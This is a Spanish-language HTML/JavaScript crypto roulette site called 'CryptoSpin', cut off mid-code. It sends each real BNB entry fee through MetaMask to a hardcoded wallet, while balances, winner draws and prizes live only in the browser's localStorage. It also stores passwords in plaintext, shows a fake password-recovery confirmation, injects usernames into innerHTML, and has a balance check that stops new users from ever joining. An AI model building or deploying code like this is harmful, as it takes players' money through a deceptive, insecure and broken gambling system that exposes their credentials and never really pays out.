<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CryptoSpin - BNB Gaming Platform</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .wheel-container {
            width: 300px;
            height: 300px;
            border-radius: 50%;
            border: 4px solid #4ade80;
            position: relative;
            margin: 20px auto;
            overflow: hidden;
            background: conic-gradient(
                #ff6b6b 0deg 18deg,
                #4ecdc4 18deg 36deg,
                #45b7d1 36deg 54deg,
                #96ceb4 54deg 72deg,
                #feca57 72deg 90deg,
                #ff9ff3 90deg 108deg,
                #54a0ff 108deg 126deg,
                #5f27cd 126deg 144deg,
                #00d2d3 144deg 162deg,
                #ff9f43 162deg 180deg,
                #ee5a24 180deg 198deg,
                #009432 198deg 216deg,
                #0652dd 216deg 234deg,
                #9c88ff 234deg 252deg,
                #fbc531 252deg 270deg,
                #4834d4 270deg 288deg,
                #686de0 288deg 306deg,
                #30336b 306deg 324deg,
                #eb4d4b 324deg 342deg,
                #6ab04c 342deg 360deg
            );
            transition: transform 4s cubic-bezier(0.23, 1, 0.32, 1);
        }
        .wheel-pointer {
            position: absolute;
            top: -10px;
            left: 50%;
            transform: translateX(-50%);
            width: 0;
            height: 0;
            border-left: 15px solid transparent;
            border-right: 15px solid transparent;
            border-top: 30px solid #fff;
            z-index: 10;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.8);
            z-index: 1000;
        }
        .modal.active {
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .recording-indicator {
            background: red;
            border-radius: 50%;
            width: 12px;
            height: 12px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }
        .sidebar {
            transition: transform 0.3s ease;
        }
        .sidebar.hidden {
            transform: translateX(-100%);
        }
        .tab-content {
            display: none;
        }
        .tab-content.active {
            display: block;
        }
    </style>
</head>
<body class="bg-gray-900 text-white">
    <!-- Header -->
    <header class="bg-gray-800 p-4 flex justify-between items-center shadow-lg">
        <div class="flex items-center gap-4">
            <button id="toggleSidebar" class="text-2xl hover:text-green-400">
                <i class="fas fa-bars"></i>
            </button>
            <h1 class="text-2xl font-bold text-green-400">CryptoSpin</h1>
        </div>
        <div class="flex items-center gap-4">
            <div class="text-right">
                <div class="text-sm text-gray-400">Balance</div>
                <div class="font-bold text-green-400">$<span id="userBalance">0.00</span></div>
            </div>
            <button id="userProfileBtn" class="w-10 h-10 bg-green-600 rounded-full flex items-center justify-center hover:bg-green-700">
                <i class="fas fa-user"></i>
            </button>
        </div>
    </header>

    <!-- Sidebar -->
    <div id="sidebar" class="sidebar fixed left-0 top-0 h-full w-64 bg-gray-800 shadow-lg z-50 pt-16">
        <nav class="p-4">
            <ul class="space-y-2">
                <li><a href="#" class="nav-link block p-3 rounded hover:bg-gray-700" data-tab="rooms"><i class="fas fa-dice mr-2"></i>Salas de Juego</a></li>
                <li><a href="#" class="nav-link block p-3 rounded hover:bg-gray-700" data-tab="profile"><i class="fas fa-user mr-2"></i>Mi Perfil</a></li>
                <li><a href="#" class="nav-link block p-3 rounded hover:bg-gray-700" data-tab="dashboard"><i class="fas fa-chart-line mr-2"></i>Dashboard</a></li>
                <li><a href="#" class="nav-link block p-3 rounded hover:bg-gray-700" data-tab="recordings"><i class="fas fa-video mr-2"></i>Grabaciones</a></li>
                <li><a href="#" class="nav-link block p-3 rounded hover:bg-gray-700" data-tab="withdrawal"><i class="fas fa-money-bill-wave mr-2"></i>Retiros</a></li>
                <li><button id="logoutBtn" class="w-full text-left block p-3 rounded hover:bg-red-600"><i class="fas fa-sign-out-alt mr-2"></i>Cerrar Sesión</button></li>
            </ul>
        </nav>
    </div>

    <!-- Main Content -->
    <main id="mainContent" class="ml-64 p-6 transition-all duration-300">
        <!-- Auth Section -->
        <div id="authSection" class="min-h-screen flex items-center justify-center">
            <div class="bg-gray-800 p-8 rounded-xl shadow-xl w-full max-w-md">
                <h2 class="text-2xl font-bold text-center mb-6">Bienvenido a CryptoSpin</h2>
                
                <!-- Login Form -->
                <div id="loginForm" class="tab-content active">
                    <h3 class="text-xl mb-4">Iniciar Sesión</h3>
                    <form id="loginFormEl">
                        <div class="mb-4">
                            <input type="email" id="loginEmail" placeholder="Email" required 
                                   class="w-full p-3 bg-gray-700 rounded border border-gray-600 focus:border-green-400">
                        </div>
                        <div class="mb-4">
                            <input type="password" id="loginPassword" placeholder="Contraseña" required
                                   class="w-full p-3 bg-gray-700 rounded border border-gray-600 focus:border-green-400">
                        </div>
                        <button type="submit" class="w-full bg-green-600 p-3 rounded font-bold hover:bg-green-700">
                            Iniciar Sesión
                        </button>
                    </form>
                    <div class="mt-4 text-center">
                        <button id="showRegisterBtn" class="text-green-400 hover:underline">¿No tienes cuenta? Regístrate</button>
                        <br>
                        <button id="showRecoverBtn" class="text-blue-400 hover:underline mt-2">¿Olvidaste tu contraseña?</button>
                    </div>
                </div>

                <!-- Register Form -->
                <div id="registerForm" class="tab-content">
                    <h3 class="text-xl mb-4">Crear Cuenta</h3>
                    <form id="registerFormEl">
                        <div class="mb-4">
                            <input type="text" id="registerName" placeholder="Nombre completo" required
                                   class="w-full p-3 bg-gray-700 rounded border border-gray-600 focus:border-green-400">
                        </div>
                        <div class="mb-4">
                            <input type="email" id="registerEmail" placeholder="Email" required
                                   class="w-full p-3 bg-gray-700 rounded border border-gray-600 focus:border-green-400">
                        </div>
                        <div class="mb-4">
                            <input type="password" id="registerPassword" placeholder="Contraseña" required
                                   class="w-full p-3 bg-gray-700 rounded border border-gray-600 focus:border-green-400">
                        </div>
                        <div class="mb-4">
                            <input type="text" id="registerWallet" placeholder="Dirección de Wallet BNB" required
                                   class="w-full p-3 bg-gray-700 rounded border border-gray-600 focus:border-green-400">
                        </div>
                        <button type="submit" class="w-full bg-green-600 p-3 rounded font-bold hover:bg-green-700">
                            Crear Cuenta
                        </button>
                    </form>
                    <div class="mt-4 text-center">
                        <button id="showLoginBtn" class="text-green-400 hover:underline">¿Ya tienes cuenta? Inicia sesión</button>
                    </div>
                </div>

                <!-- Password Recovery Form -->
                <div id="recoverForm" class="tab-content">
                    <h3 class="text-xl mb-4">Recuperar Contraseña</h3>
                    <form id="recoverFormEl">
                        <div class="mb-4">
                            <input type="email" id="recoverEmail" placeholder="Email" required
                                   class="w-full p-3 bg-gray-700 rounded border border-gray-600 focus:border-green-400">
                        </div>
                        <button type="submit" class="w-full bg-blue-600 p-3 rounded font-bold hover:bg-blue-700">
                            Enviar Código de Recuperación
                        </button>
                    </form>
                    <div class="mt-4 text-center">
                        <button id="backToLoginBtn" class="text-green-400 hover:underline">Volver al inicio de sesión</button>
                    </div>
                </div>
            </div>
        </div>

        <!-- Game Rooms Section -->
        <div id="roomsSection" class="tab-content">
            <h2 class="text-2xl font-bold mb-6">Salas de Juego</h2>
            <div id="roomsContainer" class="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-6"></div>
        </div>

        <!-- Profile Section -->
        <div id="profileSection" class="tab-content">
            <h2 class="text-2xl font-bold mb-6">Mi Perfil</h2>
            <div class="bg-gray-800 p-6 rounded-xl">
                <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                    <div>
                        <h3 class="text-lg font-semibold mb-4">Información Personal</h3>
                        <div class="space-y-4">
                            <div>
                                <label class="block text-sm font-medium mb-1">Nombre</label>
                                <input type="text" id="profileName" class="w-full p-3 bg-gray-700 rounded">
                            </div>
                            <div>
                                <label class="block text-sm font-medium mb-1">Email</label>
                                <input type="email" id="profileEmail" class="w-full p-3 bg-gray-700 rounded" readonly>
                            </div>
                            <div>
                                <label class="block text-sm font-medium mb-1">Wallet BNB</label>
                                <input type="text" id="profileWallet" class="w-full p-3 bg-gray-700 rounded">
                            </div>
                        </div>
                    </div>
                    <div>
                        <h3 class="text-lg font-semibold mb-4">Cambiar Contraseña</h3>
                        <div class="space-y-4">
                            <input type="password" id="currentPassword" placeholder="Contraseña actual" class="w-full p-3 bg-gray-700 rounded">
                            <input type="password" id="newPassword" placeholder="Nueva contraseña" class="w-full p-3 bg-gray-700 rounded">
                            <input type="password" id="confirmPassword" placeholder="Confirmar nueva contraseña" class="w-full p-3 bg-gray-700 rounded">
                            <button id="changePasswordBtn" class="w-full bg-blue-600 p-3 rounded font-bold hover:bg-blue-700">
                                Cambiar Contraseña
                            </button>
                        </div>
                    </div>
                </div>
                <div class="mt-6">
                    <button id="updateProfileBtn" class="bg-green-600 px-6 py-3 rounded font-bold hover:bg-green-700">
                        Actualizar Perfil
                    </button>
                </div>
            </div>
        </div>

        <!-- Dashboard Section -->
        <div id="dashboardSection" class="tab-content">
            <h2 class="text-2xl font-bold mb-6">Dashboard</h2>
            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 mb-6">
                <div class="bg-gray-800 p-6 rounded-xl text-center">
                    <div class="text-3xl font-bold text-green-400">$<span id="totalEarnings">0.00</span></div>
                    <div class="text-gray-400">Ganancias Totales</div>
                </div>
                <div class="bg-gray-800 p-6 rounded-xl text-center">
                    <div class="text-3xl font-bold text-blue-400"><span id="totalGames">0</span></div>
                    <div class="text-gray-400">Juegos Jugados</div>
                </div>
                <div class="bg-gray-800 p-6 rounded-xl text-center">
                    <div class="text-3xl font-bold text-yellow-400"><span id="totalWins">0</span></div>
                    <div class="text-gray-400">Victorias</div>
                </div>
            </div>
            <div class="bg-gray-800 p-6 rounded-xl">
                <h3 class="text-lg font-semibold mb-4">Historial de Ganancias</h3>
                <div id="earningsHistory" class="space-y-2 max-h-64 overflow-y-auto">
                    <!-- Historial se llenará dinámicamente -->
                </div>
            </div>
        </div>

        <!-- Recordings Section -->
        <div id="recordingsSection" class="tab-content">
            <h2 class="text-2xl font-bold mb-6">Grabaciones de Salas</h2>
            <div id="recordingsContainer" class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                <!-- Grabaciones se llenarán dinámicamente -->
            </div>
        </div>

        <!-- Withdrawal Section -->
        <div id="withdrawalSection" class="tab-content">
            <h2 class="text-2xl font-bold mb-6">Retiros</h2>
            <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
                <div class="bg-gray-800 p-6 rounded-xl">
                    <h3 class="text-lg font-semibold mb-4">Solicitar Retiro</h3>
                    <div class="space-y-4">
                        <div>
                            <label class="block text-sm font-medium mb-1">Monto a retirar (Mínimo $10)</label>
                            <input type="number" id="withdrawalAmount" min="10" step="0.01" placeholder="10.00" 
                                   class="w-full p-3 bg-gray-700 rounded">
                        </div>
                        <div>
                            <label class="block text-sm font-medium mb-1">Dirección de Wallet BNB</label>
                            <input type="text" id="withdrawalWallet" class="w-full p-3 bg-gray-700 rounded">
                        </div>
                        <button id="requestWithdrawalBtn" class="w-full bg-green-600 p-3 rounded font-bold hover:bg-green-700">
                            Solicitar Retiro
                        </button>
                    </div>
                </div>
                <div class="bg-gray-800 p-6 rounded-xl">
                    <h3 class="text-lg font-semibold mb-4">Historial de Retiros</h3>
                    <div id="withdrawalHistory" class="space-y-2 max-h-64 overflow-y-auto">
                        <!-- Historial se llenará dinámicamente -->
                    </div>
                </div>
            </div>
        </div>
    </main>

    <!-- Modals -->
    <div id="wheelModal" class="modal">
        <div class="bg-gray-800 p-6 rounded-xl max-w-md w-full mx-4">
            <div class="text-center">
                <div class="flex items-center justify-center gap-2 mb-4">
                    <div class="recording-indicator"></div>
                    <span class="text-sm text-red-400">GRABANDO</span>
                </div>
                <h3 class="text-xl font-bold mb-4">Sala #<span id="modalRoomId"></span></h3>
                <div class="wheel-container" id="wheelContainer">
                    <div class="wheel-pointer"></div>
                    <div class="absolute inset-0 flex items-center justify-center">
                        <div class="bg-white text-black rounded-full w-16 h-16 flex items-center justify-center font-bold">
                            <span id="wheelResult">?</span>
                        </div>
                    </div>
                </div>
                <div class="mt-4">
                    <div class="text-sm text-gray-400">Próximo giro en: <span id="countdown">7</span> segundos</div>
                    <div class="text-sm text-gray-400 mt-2">Giro <span id="currentSpin">1</span> de 3</div>
                </div>
                <button id="closeModalBtn" class="mt-4 bg-gray-600 px-4 py-2 rounded hover:bg-gray-700">
                    Cerrar
                </button>
            </div>
        </div>
    </div>

    <script>
        // Variables globales
        let currentUser = null;
        let users = JSON.parse(localStorage.getItem('cryptospin_users') || '[]');
        let rooms = JSON.parse(localStorage.getItem('cryptospin_rooms') || '[]');
        let recordings = JSON.parse(localStorage.getItem('cryptospin_recordings') || '[]');
        let currentBNBPrice = 300; // Precio inicial de BNB
        const ADMIN_EMAIL = 'admin@cryptospin.com';

        // Configuración de ruleta
        const wheelSegments = 20;
        const segmentAngle = 360 / wheelSegments;

        // Inicialización
        document.addEventListener('DOMContentLoaded', function() {
            initializeApp();
            loadBNBPrice();
            setInterval(loadBNBPrice, 60000); // Actualizar precio cada minuto
        });

        function initializeApp() {
            setupEventListeners();
            checkAuthStatus();
            initializeRooms();
        }

        function setupEventListeners() {
            // Auth events
            document.getElementById('loginFormEl').addEventListener('submit', handleLogin);
            document.getElementById('registerFormEl').addEventListener('submit', handleRegister);
            document.getElementById('recoverFormEl').addEventListener('submit', handlePasswordRecovery);
            
            // Auth navigation
            document.getElementById('showRegisterBtn').addEventListener('click', () => showAuthTab('registerForm'));
            document.getElementById('showLoginBtn').addEventListener('click', () => showAuthTab('loginForm'));
            document.getElementById('showRecoverBtn').addEventListener('click', () => showAuthTab('recoverForm'));
            document.getElementById('backToLoginBtn').addEventListener('click', () => showAuthTab('loginForm'));
            
            // Navigation
            document.getElementById('toggleSidebar').addEventListener('click', toggleSidebar);
            document.getElementById('logoutBtn').addEventListener('click', logout);
            
            // Tab navigation
            document.querySelectorAll('.nav-link').forEach(link => {
                link.addEventListener('click', (e) => {
                    e.preventDefault();
                    showTab(link.dataset.tab);
                });
            });
            
            // Profile events
            document.getElementById('updateProfileBtn').addEventListener('click', updateProfile);
            document.getElementById('changePasswordBtn').addEventListener('click', changePassword);
            
            // Withdrawal events
            document.getElementById('requestWithdrawalBtn').addEventListener('click', requestWithdrawal);
            
            // Modal events
            document.getElementById('closeModalBtn').addEventListener('click', closeWheelModal);
        }

        function showAuthTab(tabId) {
            document.querySelectorAll('#authSection .tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            document.getElementById(tabId).classList.add('active');
        }

        function checkAuthStatus() {
            const savedUser = localStorage.getItem('cryptospin_current_user');
            if (savedUser) {
                currentUser = JSON.parse(savedUser);
                showMainApp();
            } else {
                showAuthSection();
            }
        }

        function showAuthSection() {
            document.getElementById('authSection').style.display = 'flex';
            document.getElementById('mainContent').classList.add('ml-0');
            document.getElementById('mainContent').classList.remove('ml-64');
            document.getElementById('sidebar').style.display = 'none';
            document.querySelector('header').style.display = 'none';
        }

        function showMainApp() {
            document.getElementById('authSection').style.display = 'none';
            document.getElementById('mainContent').classList.remove('ml-0');
            document.getElementById('mainContent').classList.add('ml-64');
            document.getElementById('sidebar').style.display = 'block';
            document.querySelector('header').style.display = 'flex';
            updateUserInfo();
            showTab('rooms');
        }

        function handleLogin(e) {
            e.preventDefault();
            const email = document.getElementById('loginEmail').value;
            const password = document.getElementById('loginPassword').value;
            
            const user = users.find(u => u.email === email && u.password === password);
            if (user) {
                currentUser = user;
                localStorage.setItem('cryptospin_current_user', JSON.stringify(user));
                showMainApp();
                showNotification('¡Bienvenido de nuevo!', 'success');
            } else {
                showNotification('Email o contraseña incorrectos', 'error');
            }
        }

        function handleRegister(e) {
            e.preventDefault();
            const name = document.getElementById('registerName').value;
            const email = document.getElementById('registerEmail').value;
            const password = document.getElementById('registerPassword').value;
            const wallet = document.getElementById('registerWallet').value;
            
            if (users.find(u => u.email === email)) {
                showNotification('El email ya está registrado', 'error');
                return;
            }
            
            const newUser = {
                id: Date.now(),
                name,
                email,
                password,
                wallet,
                balance: 0,
                totalEarnings: 0,
                totalGames: 0,
                totalWins: 0,
                earningsHistory: [],
                withdrawalHistory: [],
                createdAt: new Date().toISOString()
            };
            
            users.push(newUser);
            localStorage.setItem('cryptospin_users', JSON.stringify(users));
            
            currentUser = newUser;
            localStorage.setItem('cryptospin_current_user', JSON.stringify(newUser));
            
            showMainApp();
            showNotification('¡Cuenta creada exitosamente!', 'success');
        }

        function handlePasswordRecovery(e) {
            e.preventDefault();
            const email = document.getElementById('recoverEmail').value;
            
            const user = users.find(u => u.email === email);
            if (user) {
                showNotification('Se ha enviado un código de recuperación a tu email', 'success');
                showAuthTab('loginForm');
            } else {
                showNotification('Email no encontrado', 'error');
            }
        }

        function updateUserInfo() {
            if (currentUser) {
                document.getElementById('userBalance').textContent = currentUser.balance.toFixed(2);
                
                // Update profile form
                document.getElementById('profileName').value = currentUser.name;
                document.getElementById('profileEmail').value = currentUser.email;
                document.getElementById('profileWallet').value = currentUser.wallet;
                
                // Update dashboard
                document.getElementById('totalEarnings').textContent = currentUser.totalEarnings.toFixed(2);
                document.getElementById('totalGames').textContent = currentUser.totalGames;
                document.getElementById('totalWins').textContent = currentUser.totalWins;
                
                // Update withdrawal wallet
                document.getElementById('withdrawalWallet').value = currentUser.wallet;
                
                updateEarningsHistory();
                updateWithdrawalHistory();
            }
        }

        function updateProfile() {
            if (currentUser) {
                currentUser.name = document.getElementById('profileName').value;
                currentUser.wallet = document.getElementById('profileWallet').value;
                
                // Update user in users array
                const userIndex = users.findIndex(u => u.id === currentUser.id);
                if (userIndex !== -1) {
                    users[userIndex] = currentUser;
                    localStorage.setItem('cryptospin_users', JSON.stringify(users));
                    localStorage.setItem('cryptospin_current_user', JSON.stringify(currentUser));
                }
                
                showNotification('Perfil actualizado correctamente', 'success');
            }
        }

        function changePassword() {
            const current = document.getElementById('currentPassword').value;
            const newPass = document.getElementById('newPassword').value;
            const confirm = document.getElementById('confirmPassword').value;
            
            if (current !== currentUser.password) {
                showNotification('Contraseña actual incorrecta', 'error');
                return;
            }
            
            if (newPass !== confirm) {
                showNotification('Las contraseñas no coinciden', 'error');
                return;
            }
            
            if (newPass.length < 6) {
                showNotification('La contraseña debe tener al menos 6 caracteres', 'error');
                return;
            }
            
            currentUser.password = newPass;
            const userIndex = users.findIndex(u => u.id === currentUser.id);
            if (userIndex !== -1) {
                users[userIndex] = currentUser;
                localStorage.setItem('cryptospin_users', JSON.stringify(users));
                localStorage.setItem('cryptospin_current_user', JSON.stringify(currentUser));
            }
            
            // Clear form
            document.getElementById('currentPassword').value = '';
            document.getElementById('newPassword').value = '';
            document.getElementById('confirmPassword').value = '';
            
            showNotification('Contraseña cambiada exitosamente', 'success');
        }

        function showTab(tabName) {
            // Hide all tab contents
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Show selected tab
            const selectedTab = document.getElementById(tabName + 'Section');
            if (selectedTab) {
                selectedTab.classList.add('active');
            }
            
            // Update active nav link
            document.querySelectorAll('.nav-link').forEach(link => {
                link.classList.remove('bg-gray-700');
            });
            document.querySelector(`[data-tab="${tabName}"]`).classList.add('bg-gray-700');
            
            // Load specific tab data
            if (tabName === 'recordings') {
                loadRecordings();
            }
        }

        function toggleSidebar() {
            const sidebar = document.getElementById('sidebar');
            const mainContent = document.getElementById('mainContent');
            
            sidebar.classList.toggle('hidden');
            if (sidebar.classList.contains('hidden')) {
                mainContent.classList.remove('ml-64');
                mainContent.classList.add('ml-0');
            } else {
                mainContent.classList.remove('ml-0');
                mainContent.classList.add('ml-64');
            }
        }

        function logout() {
            currentUser = null;
            localStorage.removeItem('cryptospin_current_user');
            showAuthSection();
            showNotification('Sesión cerrada', 'success');
        }

        // Game logic
        async function loadBNBPrice() {
            try {
                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
                const data = await response.json();
                currentBNBPrice = data.binancecoin.usd;
            } catch (error) {
                console.error('Error loading BNB price:', error);
            }
        }

        function initializeRooms() {
            if (rooms.length === 0) {
                for (let i = 1; i <= 10; i++) {
                    rooms.push({
                        id: i,
                        participants: [],
                        status: 'waiting', // waiting, spinning, completed
                        currentSpin: 0,
                        maxSpins: 3,
                        prizes: [10, 10, 50],
                        winners: [],
                        recording: null,
                        startTime: null
                    });
                }
                localStorage.setItem('cryptospin_rooms', JSON.stringify(rooms));
            }
            renderRooms();
        }

        function renderRooms() {
            const container = document.getElementById('roomsContainer');
            container.innerHTML = '';
            
            rooms.forEach(room => {
                const roomEl = document.createElement('div');
                roomEl.className = 'bg-gray-800 rounded-xl p-6 shadow-xl';
                roomEl.innerHTML = `
                    <div class="flex justify-between items-start mb-4">
                        <div>
                            <h3 class="text-xl font-bold text-green-400">Sala #${room.id}</h3>
                            <p class="text-gray-400">Participantes: ${room.participants.length}/200</p>
                            <p class="text-sm text-gray-500">Estado: ${getStatusText(room.status)}</p>
                        </div>
                        <div class="text-right text-sm">
                            <div class="bg-green-600 px-3 py-1 rounded-full text-white font-bold mb-2">
                                GANA $50 CON $0.50
                            </div>
                            <div class="space-y-1">
                                <p>3 ENTRE 200 PARTICIPANTES</p>
                                <p>GIRO 1️⃣ $10</p>
                                <p>GIRO 2️⃣ $10</p>
                                <p>GIRO 3️⃣ $50 🏆</p>
                            </div>
                        </div>
                    </div>
                    
                    ${room.status === 'waiting' ? `
                        <div class="mb-4">
                            <label class="block text-sm font-medium mb-2">Selecciona tu número (1-200):</label>
                            <select id="numberSelect-${room.id}" class="w-full p-3 bg-gray-700 rounded border border-gray-600">
                                <option value="">-- Selecciona un número --</option>
                                ${getAvailableNumbers(room).map(n => `<option value="${n}">${n}</option>`).join('')}
                            </select>
                        </div>
                        <div class="mb-4">
                            <p class="text-sm">Precio: <strong class="text-green-400">${(0.5 / currentBNBPrice).toFixed(6)} BNB ($0.50)</strong></p>
                        </div>
                        <button onclick="joinRoom(${room.id})" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-4 rounded-lg transition">
                            Unirse por $0.50
                        </button>
                    ` : room.status === 'spinning' ? `
                        <div class="text-center">
                            <div class="bg-yellow-600 text-white px-4 py-2 rounded-lg mb-2">
                                🎰 GIRANDO RULETA - GIRO ${room.currentSpin + 1}/3
                            </div>
                            <button onclick="watchRoom(${room.id})" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-lg">
                                Ver en Vivo
                            </button>
                        </div>
                    ` : `
                        <div class="text-center">
                            <div class="bg-gray-600 text-white px-4 py-2 rounded-lg mb-2">
                                ✅ COMPLETADA
                            </div>
                            <button onclick="viewRecording(${room.id})" class="bg-purple-600 hover:bg-purple-700 text-white font-bold py-2 px-4 rounded-lg">
                                Ver Grabación
                            </button>
                        </div>
                    `}
                    
                    ${room.winners.length > 0 ? `
                        <div class="mt-4 p-3 bg-yellow-900 rounded-lg">
                            <h4 class="font-bold text-yellow-400 mb-2">🏆 Ganadores:</h4>
                            ${room.winners.map(w => `
                                <div class="text-sm">
                                    Giro ${w.spinNumber}: ${w.userName} - ${w.prize}
                                </div>
                            `).join('')}
                        </div>
                    ` : ''}
                `;
                container.appendChild(roomEl);
            });
        }

        function getStatusText(status) {
            switch(status) {
                case 'waiting': return 'Esperando participantes';
                case 'spinning': return 'En juego';
                case 'completed': return 'Completada';
                default: return 'Desconocido';
            }
        }

        function getAvailableNumbers(room) {
            const taken = room.participants.map(p => p.number);
            const available = [];
            for (let i = 1; i <= 200; i++) {
                if (!taken.includes(i)) {
                    available.push(i);
                }
            }
            return available;
        }

        async function joinRoom(roomId) {
            if (!currentUser) {
                showNotification('Debes iniciar sesión para jugar', 'error');
                return;
            }

            const room = rooms.find(r => r.id === roomId);
            if (!room || room.status !== 'waiting') {
                showNotification('La sala no está disponible', 'error');
                return;
            }

            const selectedNumber = document.getElementById(`numberSelect-${roomId}`).value;
            if (!selectedNumber) {
                showNotification('Selecciona un número', 'error');
                return;
            }

            if (room.participants.find(p => p.number == selectedNumber)) {
                showNotification('Ese número ya está ocupado', 'error');
                return;
            }

            if (room.participants.find(p => p.userId === currentUser.id)) {
                showNotification('Ya estás participando en esta sala', 'error');
                return;
            }

            if (currentUser.balance < 0.50) {
                showNotification('Balance insuficiente. Necesitas $0.50 para jugar', 'error');
                return;
            }

            // Simulate BNB payment
            if (!await processPayment()) {
                return;
            }

            // Add participant
            room.participants.push({
                userId: currentUser.id,
                userName: currentUser.name,
                number: parseInt(selectedNumber),
                joinedAt: new Date().toISOString()
            });

            // Deduct from balance
            currentUser.balance -= 0.50;
            currentUser.totalGames++;
            updateUserInStorage();

            // Check if room is full
            if (room.participants.length >= 200) {
                startRoomSpinning(room);
            }

            saveRooms();
            renderRooms();
            updateUserInfo();
            showNotification(`¡Te uniste a la Sala #${roomId} con el número ${selectedNumber}!`, 'success');
        }

        async function processPayment() {
            if (!window.ethereum) {
                showNotification('Por favor instala MetaMask para realizar pagos', 'error');
                return false;
            }

            try {
                // Switch to BSC
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }],
                });

                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                const bnbAmount = (0.5 / currentBNBPrice).toFixed(6);
                
                await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: accounts[0],
                        to: '0x659a0f0D27378c9f25B97B0fE0F0df6fD1a6D3d4',
                        value: '0x' + Math.floor(bnbAmount * 1e18).toString(16)
                    }],
                });

                return true;
            } catch (error) {
                showNotification('Error en el pago: ' + error.message, 'error');
                return false;
            }
        }

        function startRoomSpinning(room) {
            room.status = 'spinning';
            room.currentSpin = 0;
            room.startTime = new Date().toISOString();
            room.recording = {
                id: Date.now(),
                roomId: room.id,
                startTime: room.startTime,
                spins: []
            };

            // Start spinning sequence
            setTimeout(() => spinWheel(room), 1000);
        }

        function spinWheel(room) {
            if (room.currentSpin >= room.maxSpins) {
                completeRoom(room);
                return;
            }

            const participants = room.participants;
            const winnerIndex = Math.floor(Math.random() * participants.length);
            const winner = participants[winnerIndex];
            const prize = room.prizes[room.currentSpin];

            // Add winner
            room.winners.push({
                spinNumber: room.currentSpin + 1,
                userId: winner.userId,
                userName: winner.userName,
                number: winner.number,
                prize: prize,
                timestamp: new Date().toISOString()
            });

            // Record spin
            room.recording.spins.push({
                spinNumber: room.currentSpin + 1,
                winner: winner,
                prize: prize,
                timestamp: new Date().toISOString()
            });

            // Award prize to winner
            const winnerUser = users.find(u => u.id === winner.userId);
            if (winnerUser) {
                winnerUser.balance += prize;
                winnerUser.totalEarnings += prize;
                winnerUser.totalWins++;
                
                winnerUser.earningsHistory.push({
                    roomId: room.id,
                    spinNumber: room.currentSpin + 1,
                    amount: prize,
                    timestamp: new Date().toISOString()
                });

                // Update in storage
                const userIndex = users.findIndex(u => u.id === winner.userId);
                if (userIndex !== -1) {
                    users[userIndex] = winnerUser;
                }
                
                // Update current user if it's the winner
                if (currentUser && currentUser.id === winner.userId) {
                    currentUser = winnerUser;
                    localStorage.setItem('cryptospin_current_user', JSON.stringify(currentUser));
                    updateUserInfo();
                }
            }

            room.currentSpin++;
            
            // Save progress
            saveRooms();
            localStorage.setItem('cryptospin_users', JSON.stringify(users));
            renderRooms();

            // Continue spinning after delay
            if (room.currentSpin < room.maxSpins) {
                setTimeout(() => spinWheel(room), 7000);
            } else {
                setTimeout(() => completeRoom(room), 2000);
            }
        }

        function completeRoom(room) {
            room.status = 'completed';
            room.recording.endTime = new Date().toISOString();
            
            // Save recording
            recordings.push(room.recording);
            localStorage.setItem('cryptospin_recordings', JSON.stringify(recordings));
            
            saveRooms();
            renderRooms();
            
            showNotification(`¡Sala #${room.id} completada! Ver grabación en la sección de grabaciones.`, 'success');
        }

        function watchRoom(roomId) {
            const room = rooms.find(r => r.id === roomId);
            if (room && room.status === 'spinning') {
                showWheelModal(room);
            }
        }

        function viewRecording(roomId) {
            const recording = recordings.find(r => r.roomId === roomId);
            if (recording) {
                showRecordingModal(recording);
            }
        }

        function showWheelModal(room) {
            document.getElementById('modalRoomId').textContent = room.id;
            document.getElementById('currentSpin').textContent = room.currentSpin + 1;
            document.getElementById('wheelModal').classList.add('active');
            
            // Start countdown
            startCountdown(room);
        }

        function startCountdown(room) {
            let count = 7;
            const countdownEl = document.getElementById('countdown');
            
            const interval = setInterval(() => {
                count--;
                countdownEl.textContent = count;
                
                if (count <= 0) {
                    clearInterval(interval);
                    simulateWheelSpin(room);
                }
            }, 1000);
        }

        function simulateWheelSpin(room) {
            const wheel = document.getElementById('wheelContainer');
            const resultEl = document.getElementById('wheelResult');
            
            // Random rotation
            const rotations = 5 + Math.random() * 5;
            const finalAngle = rotations * 360 + Math.random() * 360;
            
            wheel.style.transform = `rotate(${finalAngle}deg)`;
            
            setTimeout(() => {
                const latestWinner = room.winners[room.winners.length - 1];
                if (latestWinner) {
                    resultEl.textContent = latestWinner.number;
                    showNotification(`¡Ganador: ${latestWinner.userName} con número ${latestWinner.number}!`, 'success');
                }
            }, 4000);
        }

        function closeWheelModal() {
            document.getElementById('wheelModal').classList.remove('active');
        }

        function showRecordingModal(recording) {
            // Create recording modal
            const modal = document.createElement('div');
            modal.className = 'modal active';
            modal.innerHTML = `
                <div class="bg-gray-800 p-6 rounded-xl max-w-2xl w-full mx-4">
                    <div class="flex justify-between items-center mb-4">
                        <h3 class="text-xl font-bold">Grabación - Sala #${recording.roomId}</h3>
                        <button onclick="this.closest('.modal').remove()" class="text-gray-400 hover:text-white">
                            <i class="fas fa-times"></i>
                        </button>
                    </div>
                    <div class="space-y-4">
                        <div class="text-sm text-gray-400">
